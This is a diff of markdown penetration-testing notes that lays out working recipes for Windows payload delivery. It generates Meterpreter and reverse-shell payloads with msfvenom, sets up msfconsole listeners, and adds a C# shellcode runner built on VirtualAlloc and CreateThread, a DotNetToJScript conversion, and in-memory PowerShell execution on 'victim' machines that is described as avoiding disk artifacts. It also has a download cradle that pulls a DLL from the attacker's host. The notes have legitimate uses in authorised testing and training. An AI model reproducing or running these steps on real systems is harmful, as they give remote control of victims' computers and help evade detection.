@@ -140,8 +140,9 @@ var r = new ActiveXObject("WScript.Shell").Run("met.exe");
 ### Does not save to disk
 <details>
 1. `msfvenom -p windows/x64/shell/reverse_tcp LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f csharp`
-2. I saved DotNetToJscript-master on the kali, copy it over, then run the .sln file. 
-3. Navigate to TestClass.cs (on the right), then use this to replace the `public class TestClass` part:
+2. `msfconsole` -> `use exploit/multi/handler` -> `set PAYLOAD windows/x64/meterpreter/reverse_https` -> `set LHOST <kali ip>` -> `set LPORT <port>` -> `exploit`
+3. I saved DotNetToJscript-master on the kali, copy it over, then run the .sln file. 
+4. Navigate to TestClass.cs (on the right), then use this to replace the `public class TestClass` part:
 ```
 public class TestClass
 {
@@ -176,12 +177,65 @@ public class TestClass
     }
 }
 ```
+5. Make sure the dropdowns on the left of 'Start' at the top bar is set to 'Release' and 'x64' (or other depending on victim OS)
+6. Click Build -> Build Solution
+7. Navigate to the `DotNetToJScript/bin/Release` folder and copy `DotNetToJscript.exe` and `NDesk.Options.dll` and then also go to `ExampleAssembly/bin/Release` folder and copy `ExampleAssembly.dll` into the same folder
+8. In that folder, run `DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js`
+9. Double-click demo.js
+</details>
+
+## .exe
+
+### C# compiled (saves to memory)
+1. `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f csharp`
+2. `msfconsole` -> `use exploit/multi/handler` -> `set PAYLOAD windows/x64/meterpreter/reverse_https` -> `set LHOST <kali ip>` -> `set LPORT <port>` -> `exploit`
+3. In Visual Studio, new Console App, paste this code. Make sure the namespace title is same as the title of the project:
+```
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Net;
+using System.Text;
+using System.Threading;
+
+namespace ConsoleApp1
+{
+    class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
+            uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
+            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
+                  uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
+            UInt32 dwMilliseconds);
+        
+        static void Main(string[] args)
+        {
+            <output from 1>
+
+            int size = buf.Length;
+
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+
+            Marshal.Copy(buf, 0, addr, size);
+
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, 
+                IntPtr.Zero, 0, IntPtr.Zero);
+
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+        }
+    }
+}
+```
 4. Make sure the dropdowns on the left of 'Start' at the top bar is set to 'Release' and 'x64' (or other depending on victim OS)
 5. Click Build -> Build Solution
-6. Navigate to the `DotNetToJScript/bin/Release` folder and copy `DotNetToJscript.exe` and `NDesk.Options.dll` and then also go to `ExampleAssembly/bin/Release` folder and copy `ExampleAssembly.dll` into the same folder
-7. In that folder, run `DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js`
-8. Double-click demo.js
-</details>
+6. Find the .exe in `<project folder>/bin/x64/Release` and run it
 
 ## Powershell (doesn't save to memory)
 
@@ -190,7 +244,8 @@ public class TestClass
 Using .NET in powershell still saves temp .cs compiled code to disk that could get flagged. This method is completely in memory
 
 1. `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f ps1`
-2. In victim Powershell:
+2. `msfconsole` -> `use exploit/multi/handler` -> `set PAYLOAD windows/x64/meterpreter/reverse_https` -> `set LHOST <kali ip>` -> `set LPORT <port>` -> `exploit`
+3. In victim Powershell:
 ```
 function LookupFunc {
 
@@ -241,8 +296,9 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 ### Compile C# first
 
 1. `msfvenom -p windows/x64/shell/reverse_tcp LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f csharp`
-2. Create a new project in Visual Studio, select `Class Library (.Net Framework)` and `.NET Standard 2.1`.
-3. In Class1, type this:
+2. `msfconsole` -> `use exploit/multi/handler` -> `set PAYLOAD windows/x64/meterpreter/reverse_https` -> `set LHOST <kali ip>` -> `set LPORT <port>` -> `exploit`
+3. Create a new project in Visual Studio, select `Class Library (.Net Framework)` and `.NET Standard 2.1`.
+4. In Class1, type this:
 ```
 using System.Drawing;
 using System.Runtime.InteropServices;
@@ -284,11 +340,11 @@ namespace ClassLibrary1
     }
 }
 ```
-4. Make sure the dropdowns on the left of 'Start' at the top bar is set to 'Release' and 'x64' (or other depending on victim OS)
-5. Click Build -> Build Solution
-6. Find `ClassLibrary1.dll` and copy to the kali machine
-7. `python3 -m http.server <port of your choice>` from the folder which has your dll
-8. Powershell code:
+5. Make sure the dropdowns on the left of 'Start' at the top bar is set to 'Release' and 'x64' (or other depending on victim OS)
+6. Click Build -> Build Solution
+7. Find `ClassLibrary1.dll` and copy to the kali machine
+8. `python3 -m http.server <port of your choice>` from the folder which has your dll
+9. Powershell code:
 ```
 $data = (New-Object System.Net.WebClient).DownloadData('http://<kali ip>:<http port>/ClassLibrary1.dll')
 
